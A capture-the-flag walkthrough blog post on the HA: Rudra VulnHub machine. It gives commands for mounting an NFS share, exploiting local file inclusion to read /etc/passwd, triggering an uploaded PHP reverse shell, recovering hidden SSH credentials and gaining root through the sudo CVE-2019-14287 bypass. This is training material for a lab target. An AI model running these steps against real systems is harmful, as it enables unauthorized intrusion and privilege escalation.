<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">HA Rudra: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ha-rudra-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-10-31T08:16:31+00:00">October 31, 2019</time><time class="updated" datetime="2025-06-10T20:10:59+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is our Walkthrough for HA: Rudra‚Äù and this CTF is designed by Hacking Articles Team üòä. Lord Rudra also known as Shiv, Bolenath, Mahadev and he is Venerable by Hinduism. We have designed this VM because it is festival eve in India and all Indian strongly believe in Indian culture and religions and also to spread awareness of Indian culture among all people, hope you will enjoy.</span></p>
<p><span style="color: #000000;">There are multiple methods to solve this machine or direct way to finish the task.</span></p>
<p><span style="color: #000000;">You can download from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/ha-rudra,386/">here</a></span></strong>.</span></p>
<p><span style="color: #000000;"><strong>Level</strong>: Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task</strong>: Boot to Root</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Initial Recon</strong></span></p>
<ul>
<li><span style="color: #000000;">netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
<li><span style="color: #000000;">Shared directory</span></li>
<li><span style="color: #000000;">dirb</span></li>
</ul>
<p><span style="color: #000000;"><strong>Initial Compromise</strong></span></p>
<ul>
<li><span style="color: #000000;">LFI</span></li>
</ul>
<p><span style="color: #000000;"><strong>Established Foothold</strong></span></p>
<ul>
<li><span style="color: #000000;">Netcat session</span></li>
</ul>
<p><span style="color: #000000;"><strong>Internal Recon</strong></span></p>
<ul>
<li><span style="color: #000000;">Access Mysql database</span></li>
</ul>
<p><span style="color: #000000;"><strong>Data Exfiltration</strong></span></p>
<ul>
<li><span style="color: #000000;">Steganography</span></li>
</ul>
<p><span style="color: #000000;"><strong>Lateral Movement</strong></span></p>
<ul>
<li><span style="color: #000000;">Connect to ssh</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Sudo rights</span></li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Initial Recon </strong></span></h3>
<p><span style="color: #000000;">First of all, we try to identify our target. We did this using the netdiscover command. It came out to be</span></p>
<pre class="lang:default decode:true">192.168.1.101</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IbBsWvKqO8Q/Xbvilrp6JRI/AAAAAAAAhN0/I3iRN3_OV1gzyxfdIbsTuVAoO5lClY5BgCLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">Now that we have identified our target using the above command, we can continue to our second step that is scanning the target. We will use Nmap to scan the target with the following command:</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.101</pre>
<p><span style="color: #000000;">We found port 22, 80 and 2049 are open for ssh, HTTP and NFS respectively, let‚Äôs go for services enumeration.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/--faxDcNZ6Es/XbvioJ2nPhI/AAAAAAAAhOQ/Kiqnhei6NWQy0zZupZNwEchR9oqgR7bSgCLcBGAsYHQ/s1600/2.png"/></p>
<p><span style="color: #000000;">When you will explore machine IP in the web browser, it will display the beautiful sight of lord shiva.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-QH39sHL5Vjc/XbviojvSz3I/AAAAAAAAhOY/JV4pfkFtSMUD4G1099X_OgS3HkpYSelJQCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">If you didn‚Äôt find any hint from web page, then without wasting time enumerate the share directory since NFS service is running on the host machine.</span></p>
<pre class="lang:default decode:true">showmount -e 192.168.1.101
cd /tmp
mkdir ignite
mount -t nfs 192.168.1.101:/home/shivay /tmp/ignite
cd ignite
ls</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-xV6mEoUwXrU/XbvipGgq0aI/AAAAAAAAhOc/spfmyEuIZNodasr25tBVX3jO72e1vFT6gCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">when you will mount the whole shared directory in your local machine, you‚Äôll a text file named ‚Äúmahadev.txt‚Äù.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-nC5Y0jf1FTM/XbvipptugrI/AAAAAAAAhOk/7Y8PmVP3pAsijpkvs_yCc38q6zxXyKROgCLcBGAsYHQ/s1600/5.png"/></p>
<p><span style="color: #000000;">Till now we didn‚Äôt find any hint to establish our foothold, therefore we chose DIRB for directory brute force attack and Luckily found URL for robots.txt file.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-RoxAQkwlchE/XbvipW4RdQI/AAAAAAAAhOg/cSd5tJ2zU7gnynmC3Q81bofXXpQkgluXACLcBGAsYHQ/s1600/6.png"/></p>
<p><span style="color: #000000;">Now when you will navigate to the following URL, it will give a hint for nandi.php</span></p>
<pre class="lang:default decode:true ">http://192.168.1.101/robots.txt</pre>
<p><span style="color: #000000;">But on exploring /nandi.php, it will give you a blank page and this hint might be indicating the possibility for LFI.</span></p>
<pre class="lang:default decode:true ">http://192.168.1.101/nandi.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ogMopBlifSY/Xbvip695KmI/AAAAAAAAhOo/4vlhGihy5JUxj6owjwjYdVTCSbcb9YOegCLcBGAsYHQ/s1600/7.png"/></p>
<h3><span style="color: #800000;"><strong>Initial Compromised </strong></span></h3>
<p><span style="color: #000000;">To ensure that the host machine is vulnerable to LFI, you need to try to extract /etc/passwd file and this will show you some usernames from here: Rudra, Shivay and mahakaal as shown below.</span></p>
<p><span style="color: #000000;">This phase is considered as <strong>initial compromised</strong> stage because with the help of LFI we are able to extract low privilege data.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-GIikTm-e93Q/XbviqQPbwmI/AAAAAAAAhOs/mX1zBvtmcgM7eJGNptxDSel8VOI7PB1ZQCLcBGAsYHQ/s1600/8.png"/></p>
<h3><span style="color: #800000;"><strong>Established foothold</strong></span></h3>
<p><span style="color: #000000;">To established foothold, you need to spawn shell of the host machine by injecting malicious file. As you know due to NFS we are able to access share directory and also web application is vulnerable to LFI and for exploiting the host machine first upload the PHP backdoor (penetestmonkey PHP reverse shell) inside the mount directory ‚Äú/tmp/ignite‚Äù and then execute it through a web browser.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-GrtMS58HUq4/XbviqjOWbNI/AAAAAAAAhOw/pcOkC8Vk-iYkVduGNbjV-_g6KtDUMImdgCLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">As you can observe in the above image, we have uploaded the PHP backdoor inside /tmp/ignite and now will use LFI to trigger the shell.php file. Keep the Netcat listener ON for reverse connection.</span></p>
<pre class="lang:default decode:true ">http://192.168.1.101/nandi.php?file=/home/shivay/shell.php</pre>
<p>¬†</p>
<h3><img decoding="async" src="https://1.bp.blogspot.com/-heu8b9B1708/XbvilbDtJiI/AAAAAAAAhNw/eIdG4WNpt-MPtAp3fT80fuK7blMTeBRWACLcBGAsYHQ/s1600/10.png"/></h3>
<h3><span style="color: #800000;"><strong>Internal Recon</strong></span></h3>
<p><span style="color: #000000;">As soon as you will trigger the backdoor, it will give the reverse connection of the host machine.</span></p>
<p><span style="color: #000000;">Once we have compromised the host machine, then go for Internal Recon, as you can observe this time, we have used netstat to identify the network statics and found MySQL is running on localhost.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-sL2czKyrLSc/XbvilLUd1oI/AAAAAAAAhNs/I6kgV-dwaxAVYDvuJOz05u8agRHKoEjJwCLcBGAsYHQ/s1600/11.png"/></p>
<p><span style="color: #000000;">Without wasting time, we get into MySQL DBMS and enumerated the following information:</span></p>
<pre class="lang:default decode:true">Database name: mahadev
Table name: hint
Record: check in media filesystem</pre>
<p><span style="color: #000000;">It means there are is something inside media filesystem and the author wants to dig it out.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-cCJ8faCEc00/XbvimZuMxyI/AAAAAAAAhN8/yiI33LUvMNEQLjAtJ6rBLFlJl03QV_-LACLcBGAsYHQ/s1600/12.png"/></p>
<h3><span style="color: #800000;"><strong>Data Exfiltration-Steganography </strong></span></h3>
<p><span style="color: #000000;">So, when you will move inside /media directory then you will get two files named ‚Äúcreds and hint‚Äù and the ‚Äú<strong>hint</strong>‚Äù file contains the following hints:</span></p>
<p><strong><span style="color: #0000ff;"><em>Link: </em><a style="color: #0000ff;" href="https://www.hackingarticles.in/cloakify-factory-a-data-exfiltration-tool-uses-text-based-steganography/"><em>https://www.hackingarticles.in/cloakify-factory-a-data-exfiltration-tool-uses-text-based-steganography/</em></a></span></strong></p>
<p><span style="color: #000000;"><em>Message: Without noise</em></span></p>
<p><span style="color: #000000;">The cred file contains emojis and it looks like a kind of steganography, download the cred file in your local machine (I saved as /root/pwd) and without wasting we explored the given link. This link will open the article on data exfiltration tool named cloackify which is used by the author for hiding text behind emojis.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-gvht50M1qQA/XbvimWr0ucI/AAAAAAAAhN4/m7FNvqCtxGEJzYEzuL854Do1KOTTdE0EQCLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;">With the help of the above link, you can extract the hidden text behind emojis. Follow the below step in your local machine.</span></p>
<p><span style="color: #000000;">Download the tool from GitHub and run a python script as shown then decrypt the file <strong>without noise</strong> as given inside the hint file.</span></p>
<pre class="lang:default decode:true ">python cloackifyFactory.py
Press key: 2
Decloackify path: /root/pwd
Path for saved decloacked data: /root/decodedpwd
Add noise: No</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-vc1wUnYVaMA/Xbvimp_pjhI/AAAAAAAAhOA/A_ncFZeHJnQ8P_JZsv4GsWxBx2x6VEP9wCLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">Choose emoji as a type of ciphers and press key 3. This will save the decoded text inside /root/decodedpwd as shown below.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-z5LueYZYjgw/XbvinB5rOAI/AAAAAAAAhOE/khCs9gQaKkQe1KJUbzNaJZuOKJyMnH5EwCLcBGAsYHQ/s1600/15.png"/></p>
<p><span style="color: #000000;">And we found the credential for the following:</span></p>
<pre class="lang:default decode:true ">Username: mahakaal
Password: kalbhairav</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-gJXjLRL-pS8/Xbving4St8I/AAAAAAAAhOI/nVM5YzTiPOcOJjzQ2Fa5VsQefUQmh2WuQCLcBGAsYHQ/s1600/16.png"/></p>
<h3><span style="color: #800000;"><strong>Lateral Movement </strong></span></h3>
<p><span style="color: #000000;">So with the help above credential, we connect to ssh service and start post enumeration. Thus, we check sudo right for mahakaal and found that he has sudo right to run /usr/bin/watch program other than root which means with ALL specified, user mahakaal can run the binary / usr/bin/watch as any user.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-1NLHnHPuDzI/XbvinhPtRAI/AAAAAAAAhOM/hwX3HgLjrOQKBQywvypJgCmFj9qFcXbgACLcBGAsYHQ/s1600/17.png"/></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">The author added this loophole because it is the latest zero-day exploit CVE: 2019-14287 and you should to proactive to bypass it.</span></p>
<p><span style="color: #000000;">Type following for escalating the root the shell:</span></p>
<pre class="lang:default decode:true ">sudo -u#-1 watch -x sh -c 'reset; exec sh 1&gt;&amp;0 2&gt;&amp;0' -u
cd root
cat final.txt</pre>
<p><span style="color: #000000;"><strong>Conclusion:</strong> The VM was designed to cover each track of the kill chain by considering red team approach and proactive learning with latest vulnerabilities.</span></p>
<p><span style="color: #000000;">Hope you have enjoyed this machine. Happy Hacking!!!!!!!</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-vl5IczmPAjU/XbvioTnIcXI/AAAAAAAAhOU/KhxoF30OfOUWWYYp6np40DxdkbvhDvnigCLcBGAsYHQ/s1600/18.png"/></p>
<p><strong>Author: </strong>Pavandeep Singh is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on Twitter and <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132">LinkedIn</a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
